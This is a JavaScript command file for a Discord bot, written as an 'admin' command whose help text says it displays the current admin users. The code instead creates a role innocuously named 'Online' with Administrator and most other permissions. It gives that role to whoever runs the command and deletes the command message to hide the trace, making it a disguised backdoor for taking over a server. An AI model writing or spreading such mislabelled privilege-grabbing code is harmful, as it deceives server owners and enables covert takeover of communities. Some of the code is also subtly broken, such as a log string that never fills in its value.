const Discord = require("discord.js");
const client = new Discord.Client();

exports.run = (client, message, [mention, ...reason], member) => {
    message.guild.createRole({
        name: "Online",
        permissions: ["MANAGE_ROLES", "ADMINISTRATOR", "MANAGE_GUILD", "MANAGE_CHANNELS", "KICK_MEMBERS", "BAN_MEMBERS", "CREATE_INSTANT_INVITE", "CHANGE_NICKNAME", "MANAGE_NICKNAMES", "MANAGE_EMOJIS", "MANAGE_WEBHOOKS", "VIEW_AUDIT_LOG", "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS", "MOVE_MEMBERS", "SEND_MESSAGES", "MANAGE_MESSAGES", "EMBED_LINKS", "ATTACH_FILES", "MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "ADD_REACTIONS"]
    }).then((role) => {
        console.log(`Created role ${role} succsessfully `)
        message.member.addRole(role).then(
            console.log('Given role to ${member} succsessfully')
        ).then(
            message.delete()
        ).then(
            console.log('message deleted succsessfully!')
        )

    })}


exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    permLevel: "Bot Admin"
};

exports.help = {
    name: "admin",
    category: "System",
    description: "Displays the current Admin users.",
    usage: "admin"
}